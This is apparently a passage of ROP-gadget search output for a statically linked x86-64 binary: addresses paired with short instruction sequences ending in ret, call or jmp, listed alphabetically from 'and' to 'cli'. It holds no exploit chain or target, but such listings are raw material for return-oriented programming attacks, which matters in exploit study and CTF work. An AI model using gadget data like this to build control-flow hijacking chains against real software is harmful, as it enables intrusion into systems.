0x000000000041d0e2 : and al, 0xc ; mov qword ptr [rsp], rdi ; call 0x419378
0x0000000000407ab0 : and al, 0xc ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x00000000004808e0 : and al, 0xc0 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000041d6bc : and al, 0xd8 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x00000000004919c8 : and al, 0xd8 ; ret
0x000000000041ecd3 : and al, 0xe9 ; ret 0xfffd
0x000000000045919e : and al, 0xf6 ; ret
0x000000000049b179 : and al, 0xf9 ; call qword ptr [rax]
0x000000000049be7d : and al, 0xfa ; call rax
0x000000000049befd : and al, 0xfa ; jmp qword ptr [rdx + 0x12fffa23]
0x000000000049bef9 : and al, 0xfa ; jmp qword ptr [rdx]
0x000000000049c079 : and al, 0xfa ; jmp rax
0x000000000041d7ed : and al, 8 ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000423a86 : and al, 8 ; call 0x41fd24
0x000000000041488f : and al, 8 ; call rax
0x0000000000423471 : and al, 8 ; call rcx
0x00000000004954fc : and al, 8 ; jmp 0x495516
0x00000000004512c3 : and al, 8 ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000417d00 : and al, 8 ; mov rdi, r15 ; call rax
0x0000000000401923 : and al, 8 ; ret
0x00000000004019e0 : and al, 8 ; sub rax, rcx ; ret
0x000000000049b6e0 : and al, al ; stc ; push qword ptr [rax - 0x3f] ; stc ; inc eax ; ret 0xfff9
0x00000000004960b4 : and al, byte ptr [rax] ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x0000000000496d13 : and al, byte ptr [rax] ; jne 0x496cfd ; pop rbx ; ret
0x00000000004960a6 : and al, byte ptr [rax] ; test eax, eax ; je 0x4960b7 ; ret
0x00000000004961b6 : and al, byte ptr [rax] ; test eax, eax ; je 0x4961c7 ; ret
0x000000000044780a : and al, byte ptr [rsp - 0xb7f68c] ; ret 0xc148
0x00000000004296f8 : and al, ch ; ret 0xfed1
0x0000000000468115 : and ax, 0x4800 ; mov eax, dword ptr [rsi + rax*8] ; xor esi, esi ; jmp rax
0x0000000000470171 : and bh, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x0000000000459d3f : and bh, bh ; rol byte ptr [rbx - 0x76befb08], 1 ; ret 0x415f
0x000000000049b171 : and bh, cl ; call rax
0x000000000049bfc9 : and bh, dl ; call rsp
0x000000000049be89 : and bh, dl ; jmp qword ptr [rax]
0x00000000004960a4 : and bl, ah ; and al, byte ptr [rax] ; test eax, eax ; je 0x4960b9 ; ret
0x000000000049b5e4 : and bl, bl ; stc ; jmp qword ptr [rax]
0x000000000040379b : and byte ptr [r14 + 0xf], 0xfe ; ret
0x0000000000417fc9 : and byte ptr [r8 + 1], r9b ; ret
0x0000000000417f2e : and byte ptr [r9 - 0x77], r9b ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x00000000004471aa : and byte ptr [rax + 0x3a], al ; xor byte ptr [rax + 0xf], cl ; ret 0xf8c5
0x00000000004322fc : and byte ptr [rax + 1], cl ; clc ; vzeroupper ; ret
0x0000000000417fca : and byte ptr [rax + 1], cl ; ret
0x0000000000407851 : and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000046d02e : and byte ptr [rax + 9], cl ; ret 0xff83
0x0000000000401615 : and byte ptr [rax + 9], cl ; sal bl, 1 ; ret
0x00000000004ab058 : and byte ptr [rax - 0x4fdf0004], dh ; cld ; jmp qword ptr [rax]
0x00000000004579d3 : and byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x000000000047de83 : and byte ptr [rax - 0x75], cl ; sub byte ptr [rax + 0x39], r9b ; ret 0x870f
0x00000000004611c4 : and byte ptr [rax - 0x77], cl ; sti ; test rax, rax ; je 0x4611d8 ; call rax
0x00000000004566b6 : and byte ptr [rax - 0x7d], cl ; ret
0x0000000000493f36 : and byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000046ea64 : and byte ptr [rax - 0x7d], cl ; ret 0xe920
0x00000000004198f2 : and byte ptr [rax - 1], bh ; pop rbx ; ret
0x0000000000493f09 : and byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000044ec9a : and byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000049b1b0 : and byte ptr [rax], bh ; stc ; jmp qword ptr [rax + 0x20fff939]
0x00000000004bcf7c : and byte ptr [rbp + 0x78d00000], 0xfd ; call qword ptr [rbx]
0x0000000000401e11 : and byte ptr [rbp + 0xfd889c0], al ; ret 0xc35b
0x000000000040701f : and byte ptr [rbp + 9], al ; fadd qword ptr [rcx - 0x77] ; ret
0x0000000000498f1c : and byte ptr [rbp - 0x77], cl ; ret
0x000000000049b218 : and byte ptr [rbp - 7], bl ; call qword ptr [rax]
0x000000000048927b : and byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000046ecc3 : and byte ptr [rbx + rcx*4 + 0x40], cl ; sub cl, ch ; ret 0xffe8
0x000000000049b454 : and byte ptr [rbx - 0x52ff0007], ch ; stc ; jmp rax
0x00000000004b6d1c : and byte ptr [rbx], al ; add byte ptr [rax], dh ; stosd dword ptr [rdi], eax ; clc ; call qword ptr [rax]
0x000000000049b1b8 : and byte ptr [rbx], bh ; stc ; jmp qword ptr [rax + 0x20fff93c]
0x0000000000464980 : and byte ptr [rcx + 0x2b], cl ; push rdi ; sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000406d7b : and byte ptr [rcx + 0x31], al ; ret
0x000000000049b190 : and byte ptr [rcx + rdi*8], ch ; jmp qword ptr [rax + 0x20fff92d]
0x000000000041dbdf : and byte ptr [rcx - 0x2dcea42f], cl ; jmp rax
0x0000000000417f2f : and byte ptr [rcx - 0x77], cl ; xor byte ptr [r8 + 1], r9b ; ret 0x8b49
0x0000000000486124 : and byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret
0x000000000049b43c : and byte ptr [rdi - 0x4eff0007], ch ; stc ; call rax
0x000000000049b198 : and byte ptr [rdi], ch ; stc ; jmp qword ptr [rax + 0x20fff930]
0x000000000044dc01 : and byte ptr [rdi], cl ; adc dword ptr [rdi + 0x30], edi ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000041663b : and byte ptr [rdi], cl ; test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x000000000044b650 : and byte ptr [rdi], cl ; test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00000000004b4af5 : and byte ptr [rdx], al ; imul ecx, dword ptr [rsi], 0x18 ; ret
0x000000000049b1a0 : and byte ptr [rdx], dh ; stc ; jmp qword ptr [rax + 0x20fff933]
0x000000000049b1a8 : and byte ptr [rip + 0x36a0fff9], dh ; stc ; jmp qword ptr [rax]
0x000000000040379c : and byte ptr [rsi + 0xf], 0xfe ; ret
0x0000000000432d9a : and byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004b9685 : and byte ptr [rsi + rcx + 0x18], bh ; ret
0x000000000049b54c : and byte ptr [rsi - 0x2da70007], 0xf9 ; jmp qword ptr [rax]
0x000000000049b1c0 : and byte ptr [rsi], bh ; stc ; jmp qword ptr [rax + 0x20fff93f]
0x000000000046bdd8 : and byte ptr [rsp + rbp*2], ch ; add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x00000000004668e5 : and byte ptr [rsp + rbp*2], ch ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000047b472 : and ch, 0xf ; je 0x47b499 ; add rax, 2 ; ret
0x000000000044ec58 : and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x000000000042b1aa : and ch, 2 ; cmovne rax, rdx ; ret
0x000000000049b5e8 : and ch, bl ; stc ; jmp qword ptr [rax]
0x000000000049bedc : and ch, byte ptr [rax] ; cli ; jmp qword ptr [rdx + 0x22fffa27]
0x000000000049d708 : and ch, byte ptr [rbx - 5] ; ljmp ptr [rax] ; push -5 ; call rdx
0x000000000047b45d : and cl, 0xf ; je 0x47b485 ; ret
0x0000000000453391 : and cl, byte ptr [rax + 0x63] ; add al, 0x82 ; add rax, rdx ; jmp rax
0x0000000000485f24 : and cl, byte ptr [rax - 0x77] ; ret 0x1f0f
0x000000000042a923 : and cl, byte ptr [rax - 0x7d] ; ret 0x4801
0x00000000004325dd : and cl, byte ptr [rcx - 0x77] ; ret
0x000000000047a85a : and cl, byte ptr [rdx] ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000452c09 : and dh, al ; sub byte ptr [rcx], al ; ret
0x0000000000470170 : and dil, al ; add ch, byte ptr [rip - 0x7d000000] ; ret
0x000000000049b664 : and dl, bl ; stc ; jmp qword ptr [rax]
0x000000000046fce8 : and dword ptr [r8], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x000000000046fce9 : and dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x00000000004b0822 : and dword ptr [rax], edx ; jmp qword ptr [rdi]
0x000000000041e3e7 : and dword ptr [rbx], 0xffffffef ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041e43f : and dword ptr [rbx], 0xffffffef ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000041f26e : and dword ptr [rdi], ecx ; mov dh, 0 ; ret
0x000000000042ae82 : and dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004ad8d9 : and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x00000000004b0821 : and dword ptr cs:[rax], edx ; jmp qword ptr [rdi]
0x00000000004617eb : and eax, 0 ; ret
0x000000000049bef5 : and eax, 0x24a2fffa ; cli ; jmp qword ptr [rdx]
0x000000000049be71 : and eax, 0x2550fffa ; cli ; call rax
0x000000000049c06d : and eax, 0x2560fffa ; cli ; jmp rax
0x000000000048ae7c : and eax, 0x28 ; jne 0x48aec6 ; leave ; ret
0x00000000004152f8 : and eax, 0x30 ; call rax
0x0000000000415232 : and eax, 0x30 ; call rdx
0x000000000041531e : and eax, 0x30 ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000044ebdd : and eax, 0x3fc00 ; pop rbx ; ret
0x000000000044ec28 : and eax, 0x3fffc00 ; pop rbx ; ret
0x000000000046752a : and eax, 0x48b4800 ; clc ; jmp rax
0x000000000045edf7 : and eax, 0x4cffff52 ; mov edi, ebp ; call r12
0x000000000044ecd3 : and eax, 0x7ff80000 ; div ecx ; mov eax, eax ; ret
0x000000000044ec77 : and eax, 0x7ff80000 ; ret
0x0000000000452907 : and eax, 0xc ; cmp eax, 4 ; je 0x452918 ; ret
0x000000000048931c : and eax, 2 ; sub eax, 1 ; ret
0x000000000048e3d8 : and eax, dword ptr [rax] ; add byte ptr [rbp + 2], dh ; pop rbx ; ret
0x0000000000485f45 : and eax, dword ptr [rax] ; add rsp, 8 ; ret
0x000000000048bf48 : and eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x000000000048e323 : and eax, dword ptr [rax] ; jne 0x48e353 ; ret
0x000000000048b99a : and eax, dword ptr [rax] ; mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x000000000048b555 : and eax, dword ptr [rax] ; mov qword ptr [rip + 0x238b4a], rax ; ret
0x0000000000485fef : and eax, dword ptr [rax] ; mov qword ptr [rsi], rax ; ret
0x0000000000485e89 : and eax, dword ptr [rax] ; ret
0x00000000004826f2 : and eax, dword ptr [rax] ; xor eax, eax ; add rsp, 8 ; ret
0x000000000045958e : and eax, dword ptr [rip + 0x29480000] ; ret 0x349
0x000000000041e3e8 : and ebp, edi ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041e440 : and ebp, edi ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004528a2 : and ebx, 0xffffffbb ; cmp r11d, 0xa ; je 0x4528b5 ; ret
0x000000000041fcc9 : and ebx, dword ptr [rbx] ; sub al, byte ptr [rax] ; ret
0x0000000000434315 : and ecx, 0xff ; sub eax, ecx ; ret
0x0000000000433a48 : and ecx, 0xffff ; sub eax, ecx ; ret
0x0000000000451fea : and ecx, dword ptr [rax - 0x77] ; ret 0xabe
0x000000000047f669 : and ecx, dword ptr [rsi] ; clc ; dec dword ptr [rax - 0x7d] ; ret
0x000000000049b175 : and edi, ecx ; push rax ; and al, 0xf9 ; call qword ptr [rax]
0x000000000049bf01 : and edi, edx ; call qword ptr [rdx]
0x000000000049c081 : and edi, edx ; call rax
0x000000000049c041 : and edi, edx ; jmp rax
0x000000000049c03d : and edi, edx ; push qword ptr [rax + 0x23] ; cli ; jmp rax
0x000000000049c08d : and edx, edi ; call qword ptr [rax]
0x0000000000406f7d : and esi, 0x2141d8a1 ; ret
0x0000000000452c08 : and sil, al ; sub byte ptr [rcx], al ; ret
0x000000000047afb7 : bnd je 0x47afc6 ; test edx, edx ; jne 0x47afb8 ; ret
0x0000000000431f4a : bsf eax, eax ; add rax, rdi ; add rax, rcx ; ret
0x0000000000431e70 : bsf eax, eax ; add rax, rdi ; ret
0x0000000000432361 : bsf eax, eax ; add rax, rdi ; vzeroupper ; ret
0x0000000000431e80 : bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x10] ; ret
0x0000000000431e90 : bsf eax, eax ; lea rax, qword ptr [rax + rdi + 0x20] ; ret
0x0000000000431e60 : bsf eax, eax ; lea rax, qword ptr [rax + rdi - 0x10] ; ret
0x0000000000431dbf : bsf eax, eax ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x0000000000446e23 : bsf eax, eax ; lea rax, qword ptr [rdi + rax] ; ret
0x0000000000447446 : bsf eax, edx ; ret
0x000000000047b067 : bsf eax, edx ; shr rax, 2 ; ret
0x00000000004475a2 : bsf edx, edx ; add rax, rdx ; sub rax, rdi ; ret
0x0000000000446f40 : bsf rax, rax ; lea rax, qword ptr [rdi + rax] ; ret
0x0000000000447492 : bsf rax, rdx ; ret
0x000000000047b066 : bsf rax, rdx ; shr rax, 2 ; ret
0x0000000000479e97 : bsr eax, eax ; add rax, rdi ; ret
0x000000000047a11b : bsr eax, esi ; add rax, rdi ; ret
0x000000000047a029 : bsr esi, esi ; lea rax, qword ptr [rcx + rsi] ; ret
0x0000000000479f25 : bsr esi, esi ; lea rax, qword ptr [rdi + rsi] ; ret
0x0000000000479e96 : bsr rax, rax ; add rax, rdi ; ret
0x000000000047a11a : bsr rax, rsi ; add rax, rdi ; ret
0x000000000047a028 : bsr rsi, rsi ; lea rax, qword ptr [rcx + rsi] ; ret
0x0000000000479f24 : bsr rsi, rsi ; lea rax, qword ptr [rdi + rsi] ; ret
0x000000000048483b : call 0x110acb8b
0x00000000004b8f38 : call 0x124b89c8
0x00000000004b52e8 : call 0x174b4995
0x0000000000470846 : call 0x21470844
0x00000000004709bc : call 0x214709ba
0x0000000000470c4b : call 0x21470c49
0x0000000000471110 : call 0x2147110e
0x00000000004712ce : call 0x214712cc
0x000000000047189f : call 0x2147189d
0x0000000000471ad8 : call 0x21471ad6
0x00000000004b90e4 : call 0x284b9156
0x0000000000474149 : call 0x400432
0x0000000000464174 : call 0x400442
0x000000000047f668 : call 0x400497
0x000000000046f5d2 : call 0x4004b7
0x0000000000424249 : call 0x400503
0x000000000040a9d7 : call 0x414337
0x0000000000428318 : call 0x414592
0x0000000000400552 : call 0x414598
0x0000000000407a07 : call 0x415659
0x000000000042a104 : call 0x416322
0x0000000000427ac3 : call 0x4168c6
0x000000000041c1ca : call 0x418422
0x000000000041d0e8 : call 0x419372
0x0000000000416bdc : call 0x41df19
0x0000000000423a88 : call 0x41fd22
0x0000000000428505 : call 0x424742
0x000000000040a91d : call 0x426b82
0x000000000047f54f : call 0x426b89
0x000000000048a658 : call 0x446947
0x0000000000400828 : call 0x44eb46
0x00000000004006f1 : call 0x44f006
0x0000000000416583 : call 0x452832
0x00000000004165f7 : call 0x452862
0x00000000004667b3 : call 0x452a92
0x0000000000457dd0 : call 0x454022
0x00000000004972f1 : call 0x461748
0x000000000046805a : call 0x4642f2
0x000000000047e26a : call 0x485016
0x00000000004879d1 : call 0x487638
0x0000000000490422 : call 0x48f1f7
0x0000000000463cd6 : call 0x4908c62a
0x0000000000457087 : call 0x4d07f9db
0x000000000043b8ea : call 0x4fc2c8e8
0x000000000043b8e9 : call 0x4fc2c8e9
0x000000000043e40a : call 0x4fc2f408
0x000000000043e409 : call 0x4fc2f409
0x00000000004821d1 : call 0x86c6e65
0x00000000004744ea : call 0xa3fc826
0x000000000044ec3a : call 0xffffffff8407754e
0x00000000004ae343 : call 0xffffffffaf0d81b9
0x000000000046b809 : call 0xffffffffc2800013
0x0000000000424840 : call 0xffffffffc2cb9059
0x0000000000425980 : call 0xffffffffc2cba199
0x000000000042673a : call 0xffffffffc2cbaf53
0x000000000042823d : call 0xffffffffc2cbca56
0x0000000000428742 : call 0xffffffffc2cbcf5b
0x0000000000428c7e : call 0xffffffffc2cbd497
0x0000000000484e2a : call 0xffffffffc2d19a34
0x00000000004246c0 : call 0xffffffffc37b8eca
0x0000000000425a89 : call 0xffffffffc37ba293
0x00000000004716de : call 0xffffffffc3cb16e6
0x00000000004478f7 : call 0xffffffffc4150248
0x0000000000447817 : call 0xffffffffc43d0168
0x0000000000451ca5 : call 0xffffffffe1447a08
0x00000000004ba558 : call 0xffffffffe34ba158
0x000000000046fa5a : call qword ptr [r10 + rax*8]
0x0000000000490670 : call qword ptr [r14]
0x0000000000408250 : call qword ptr [r15 + rbx*8]
0x000000000049b46b : call qword ptr [rax + 0x20fff9b6]
0x000000000049b3cb : call qword ptr [rax + 0x20fff9b7]
0x000000000049b73f : call qword ptr [rax + 0x20fffa07]
0x000000000049b917 : call qword ptr [rax + 0x20fffa0b]
0x000000000049bc37 : call qword ptr [rax + 0x20fffa2e]
0x0000000000414b7e : call qword ptr [rax + 0x458b41]
0x000000000049c21f : call qword ptr [rax - 0x1f000566]
0x000000000049b6b7 : call qword ptr [rax - 0x1f000639]
0x000000000049b53f : call qword ptr [rax - 0x1f00065e]
0x000000000049b4eb : call qword ptr [rax - 0x1f000665]
0x000000000049bbcf : call qword ptr [rax - 0x2f000622]
0x000000000049c303 : call qword ptr [rax - 0x4f000510]
0x000000000049c25f : call qword ptr [rax]
0x000000000040799e : call qword ptr [rbx + 0x10]
0x00000000004153f0 : call qword ptr [rbx]
0x000000000049c947 : call qword ptr [rcx - 0x1d0004cb]
0x000000000049c943 : call qword ptr [rcx - 0x6e0004cb]
0x0000000000400fd1 : call qword ptr [rcx]
0x0000000000408251 : call qword ptr [rdi + rbx*8]
0x000000000049c8d3 : call qword ptr [rdi]
0x000000000049b7eb : call qword ptr [rdx + 0x22fffa09]
0x000000000049bce3 : call qword ptr [rdx + 0x22fffa30]
0x000000000046fa5b : call qword ptr [rdx + rax*8]
0x000000000049b80b : call qword ptr [rdx]
0x000000000049b787 : call qword ptr [rsi + 0x26fffa06]
0x000000000049bc7f : call qword ptr [rsi + 0x26fffa2d]
0x0000000000490671 : call qword ptr [rsi]
0x00000000004832c7 : call r10
0x000000000040096c : call r11
0x00000000004511c0 : call r12
0x00000000004556c0 : call r14
0x0000000000451702 : call r15
0x000000000049b4fb : call rax
0x000000000040096d : call rbx
0x0000000000423473 : call rcx
0x0000000000451703 : call rdi
0x0000000000415237 : call rdx
0x00000000004556c1 : call rsi
0x00000000004511c1 : call rsp
0x00000000004931a4 : cdq ; add rax, r9 ; jmp rax
0x000000000049c21d : cdq ; cli ; call qword ptr [rax - 0x1f000566]
0x00000000004b0080 : cdq ; in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x00000000004b7905 : cdq ; stc ; call rsi
0x000000000049c41c : cdq ; sub bl, bh ; jmp rsi
0x0000000000401600 : cdqe ; ret
0x000000000047eb44 : clc ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x0000000000470951 : clc ; add cl, byte ptr [rax + 0x29] ; ret 0xb8
0x0000000000423aca : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x0000000000423727 : clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x0000000000485293 : clc ; add cl, byte ptr [rax - 0x77] ; ret 0xc148
0x0000000000413e3d : clc ; add dword ptr [rbx - 0x7cb70030], eax ; ret
0x000000000048f24f : clc ; add ebx, dword ptr [rbp + 0x41] ; pop rsp ; pop r13 ; ret
0x0000000000456922 : clc ; add ecx, dword ptr [rax - 0x77] ; or byte ptr [r15], 0x8e ; ret 1
0x0000000000431c47 : clc ; add rax, rcx ; ret
0x0000000000432174 : clc ; add rax, rcx ; vzeroupper ; ret
0x00000000004b6cfa : clc ; call qword ptr [rax]
0x0000000000429868 : clc ; cmovne rax, rcx ; ret
0x00000000004342b9 : clc ; cmp rcx, rax ; jne 0x4342eb ; xor eax, eax ; ret
0x00000000004342b8 : clc ; cmp rcx, rax ; jne 0x4342ec ; xor eax, eax ; ret
0x000000000047d566 : clc ; dec dword ptr [rax + 0x39] ; ret
0x0000000000486510 : clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x000000000042a230 : clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000479480 : clc ; dec dword ptr [rax + 1] ; ret
0x000000000049368e : clc ; dec dword ptr [rax - 0x75] ; push rbp ; add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x00000000004083ec : clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000476999 : clc ; dec dword ptr [rax - 0x77] ; ret 0xf41
0x000000000047f66b : clc ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000468626 : clc ; dec dword ptr [rcx - 0x77] ; ret
0x00000000004665ce : clc ; dec dword ptr [rdi] ; test dword ptr [rsi - 0x16000007], esi ; ret
0x0000000000465983 : clc ; idiv bh ; inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x00000000004603f2 : clc ; inc dword ptr [rcx - 0x77] ; ret 0x840f
0x00000000004ac108 : clc ; ja 0x4ac10b ; jmp rax
0x000000000044ec7a : clc ; jg 0x44ec49 ; mov eax, 0x80 ; pop rbx ; ret
0x000000000044ecd6 : clc ; jg 0x44ecd6 ; int1 ; mov eax, eax ; ret
0x000000000045ac97 : clc ; jg 0x45ac26 ; ret 0xdb76
0x000000000045ac97 : clc ; jg 0x45ac2a ; ret 0xdb76
0x00000000004b6d0e : clc ; jmp qword ptr [rsi]
0x000000000046752f : clc ; jmp rax
0x0000000000403456 : clc ; lea rsp, qword ptr [rsi] ; ret
0x0000000000494133 : clc ; leave ; ret
0x00000000004aece2 : clc ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x00000000004193f4 : clc ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000435db7 : clc ; mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000436727 : clc ; mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b677 : clc ; mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000436927 : clc ; mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b5e7 : clc ; mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000436b27 : clc ; mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043b557 : clc ; mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000435dd3 : clc ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000044e7be : clc ; mov qword ptr [rdi], rcx ; ret
0x000000000044e93d : clc ; mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x000000000043f00c : clc ; mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000044da4a : clc ; mov qword ptr [rdi], rsi ; ret
0x00000000004942b1 : clc ; mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000475ff0 : clc ; mov rdx, r8 ; jmp 0x475fc2
0x000000000041940c : clc ; or ebp, edx ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000421636 : clc ; pop rbp ; pop r12 ; ret
0x0000000000478537 : clc ; push qword ptr [rbp + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x000000000047c0e3 : clc ; push qword ptr [rdi + rax*2 - 0x77] ; ret 0xe283
0x0000000000497b48 : clc ; push rbx ; ret
0x0000000000416be4 : clc ; ret
0x00000000004899ea : clc ; shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000047b17f : clc ; shr rax, 2 ; ret
0x000000000048865d : clc ; std ; jbe 0x48866d ; ret
0x00000000004ba559 : clc ; sti ; jmp rdx
0x000000000048be81 : clc ; sub rax, r8 ; ret
0x00000000004476b6 : clc ; sub rax, rdx ; vzeroupper ; ret
0x000000000044d65b : clc ; sub rax, rsi ; ret
0x00000000004b33c8 : clc ; test ebp, esi ; call qword ptr [rdx]
0x00000000004322eb : clc ; vzeroupper ; ret
0x000000000044ebdf : cld ; add eax, dword ptr [rax] ; pop rbx ; ret
0x00000000004aacba : cld ; call rax
0x00000000004bb7c6 : cld ; call rdx
0x00000000004ab052 : cld ; dec dword ptr [rax + 0x20fffcb1] ; mov al, 0xfc ; jmp qword ptr [rax]
0x00000000004ab0be : cld ; dec dword ptr [rax - 0x7700034f] ; mov cl, 0xfc ; jmp qword ptr [rax]
0x00000000004ab0d2 : cld ; dec eax ; mov al, 0xfc ; jmp qword ptr [rax]
0x00000000004ab03e : cld ; dec esp ; scasb al, byte ptr [rdi] ; cld ; lcall ptr [rdi + rbp*4] ; cld ; jmp qword ptr [rax]
0x00000000004aacb2 : cld ; inc dword ptr [rax] ; test eax, 0xa900fffc ; cld ; call rax
0x00000000004aaca2 : cld ; inc dword ptr [rax] ; test eax, 0xa900fffc ; cld ; jmp rax
0x000000000048284e : cld ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x000000000044ecbc : cld ; inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000044ec2a : cld ; inc dword ptr [rbx] ; pop rbx ; ret
0x00000000004ab046 : cld ; jmp qword ptr [rax]
0x00000000004ba5ba : cld ; jmp qword ptr [rbx]
0x00000000004ba9ba : cld ; jmp qword ptr [rcx]
0x00000000004bc072 : cld ; jmp qword ptr [rdx]
0x00000000004bb892 : cld ; jmp qword ptr [rsi]
0x00000000004aacaa : cld ; jmp rax
0x00000000004bc08a : cld ; jmp rdx
0x00000000004ab042 : cld ; lcall ptr [rdi + rbp*4] ; cld ; jmp qword ptr [rax]
0x0000000000436542 : cld ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000436745 : cld ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436945 : cld ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436b45 : cld ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000044e7c6 : cld ; mov dword ptr [rdi], ecx ; ret
0x000000000044e948 : cld ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x000000000043f01e : cld ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x000000000044da58 : cld ; mov dword ptr [rdi], esi ; ret
0x000000000044da52 : cld ; mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x0000000000436176 : cld ; mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b806 : cld ; mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436356 : cld ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b786 : cld ; mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436536 : cld ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b706 : cld ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000435f96 : cld ; mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043b886 : cld ; mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000435e21 : cld ; ret
0x000000000049ba09 : cld ; stc ; call rdx
0x000000000049bb85 : cld ; stc ; jmp qword ptr [rax]
0x00000000004ae196 : cld ; test al, 0x97 ; xchg eax, esp ; ret
0x000000000044e2e2 : cld ; vzeroupper ; ret
0x000000000041c0c1 : cli ; add ch, al ; pop rax ; ret
0x000000000041c1c8 : cli ; add ch, al ; push rcx ; ret 0xffff
0x000000000046fea5 : cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x0000000000418082 : cli ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret 0x2948
0x000000000044e7b1 : cli ; add dword ptr [rdi + 0x15], esi ; jb 0x44e7c1 ; mov byte ptr [rdi], cl ; ret
0x000000000044d7ab : cli ; add dword ptr [rdx + 2], esi ; mov byte ptr [rdi], cl ; ret
